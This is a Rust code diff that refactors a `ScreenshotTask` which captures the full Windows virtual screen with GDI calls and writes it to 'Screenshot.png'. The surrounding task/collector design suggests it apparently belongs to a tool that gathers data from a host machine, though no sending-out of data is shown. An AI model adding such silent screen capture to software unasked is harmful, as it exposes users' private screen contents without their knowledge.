@@ -20,33 +20,40 @@ pub(super) struct ScreenshotTask;
 impl<C: Collector> Task<C> for ScreenshotTask {
     parent_name!("Screenshot.png");
     
-    unsafe fn run(&self, parent: &Path, _: &C) {
-        let (width, height, pixels) = capture_screen().unwrap();
+    fn run(&self, parent: &Path, _: &C) {
+        let Ok((width, height, pixels)) = capture_screen() else {
+            return
+        };
+        
         let png = create_png(width as u32, height as u32, &pixels);
         let _ = png.write_to(parent);
     }
 }
 
-unsafe fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
-    let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    let y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
+    let (x, y, width, height) = unsafe {
+        (GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN), 
+         GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN))
+    };
 
-    let hdc = CreateDCW(
-        "DISPLAY".to_wide().as_ptr(),
-        null_mut(),
-        null_mut(),
-        null_mut()
-    );
+    let hdc = unsafe {
+        CreateDCW(
+            "DISPLAY".to_wide().as_ptr(),
+            null_mut(),
+            null_mut(),
+            null_mut()
+        )
+    };
 
-    let hdc_mem = CreateCompatibleDC(hdc);
-    let hbitmap = CreateCompatibleBitmap(hdc, width, height);
-    let _old = SelectObject(hdc_mem, hbitmap as *mut _);
+    let hdc_mem = unsafe { CreateCompatibleDC(hdc) };
+    let hbitmap = unsafe { CreateCompatibleBitmap(hdc, width, height) };
+    let _old = unsafe { SelectObject(hdc_mem, hbitmap as *mut _) };
 
-    BitBlt(hdc_mem, 0, 0, width, height, hdc, x, y, SRCCOPY);
+    unsafe {
+        BitBlt(hdc_mem, 0, 0, width, height, hdc, x, y, SRCCOPY);
+    }
 
-    let mut bmi: BITMAPINFO = zeroed();
+    let mut bmi: BITMAPINFO = unsafe { zeroed() };
     bmi.bmiHeader.biSize = size_of::<BITMAPINFOHEADER>() as _;
     bmi.bmiHeader.biWidth = width;
     bmi.bmiHeader.biHeight = -height;
@@ -55,18 +62,22 @@ unsafe fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
     bmi.bmiHeader.biCompression = BI_RGB;
 
     let mut pixels = vec![0u8; (width * height * 4) as usize];
-    let result = GetDIBits(
-        hdc_mem,
-        hbitmap,
-        0,
-        height as u32,
-        pixels.as_mut_ptr() as *mut _,
-        &mut bmi as *mut _ as *mut _,
-        DIB_RGB_COLORS,
-    );
-
-    DeleteObject(hbitmap as *mut _);
-    DeleteDC(hdc_mem);
+    let result = unsafe {
+        GetDIBits(
+            hdc_mem,
+            hbitmap,
+            0,
+            height as u32,
+            pixels.as_mut_ptr() as *mut _,
+            &mut bmi as *mut _ as *mut _,
+            DIB_RGB_COLORS,
+        )
+    };
+    
+    unsafe {
+        DeleteObject(hbitmap as *mut _);
+        DeleteDC(hdc_mem);
+    }
 
     if result == 0 {
         return Err(());
